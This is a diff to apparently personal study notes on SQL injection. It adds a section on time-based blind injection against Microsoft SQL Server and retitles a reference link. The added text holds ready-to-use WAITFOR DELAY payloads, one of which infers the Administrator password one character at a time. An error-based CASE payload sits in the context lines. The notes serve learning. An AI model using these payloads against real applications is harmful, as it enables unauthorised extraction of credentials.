@@ -240,6 +240,25 @@ We use the CASE keyword to test a condition and return different expressions dep
 xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
 ```
 
+## Blind SQLi by triggering time delays
+
+If the app catch errors and handles them, we can exploit the blind SQLi by triggerring time delays conditionally.
+
+On Microsoft SQL server, input like the following can be used :
+
+```
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+
+We can also testing one character at a time like this :
+
+```
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
+
+
+
 - - -
 
 ### Usefull links
@@ -247,6 +266,6 @@ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1
 - [SQL Injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [SQL Injection](https://portswigger.net/web-security/sql-injection)
 - [Columns of the Information Schema](https://www.postgresql.org/docs/12/infoschema-columns.html)
-- [Blind SQL Injection](https://repository.root-me.org/Exploitation%20-%20Web/FR%20-%20Blind%20SQL%20injection.pdf?_gl=1*1bdo6kh*_ga*MTMzMTU4NDg3Ny4xNjU1NjM5Mjg2*_ga_SRYSKX09J7*MTY1NTYzOTI4NS4xLjEuMTY1NTY0MDg1OS4w)
+- [Blind SQL Injection(by Ghosts In The Stack, FRENCH)](https://repository.root-me.org/Exploitation%20-%20Web/FR%20-%20Blind%20SQL%20injection.pdf?_gl=1*1bdo6kh*_ga*MTMzMTU4NDg3Ny4xNjU1NjM5Mjg2*_ga_SRYSKX09J7*MTY1NTYzOTI4NS4xLjEuMTY1NTY0MDg1OS4w)
 
 - - -
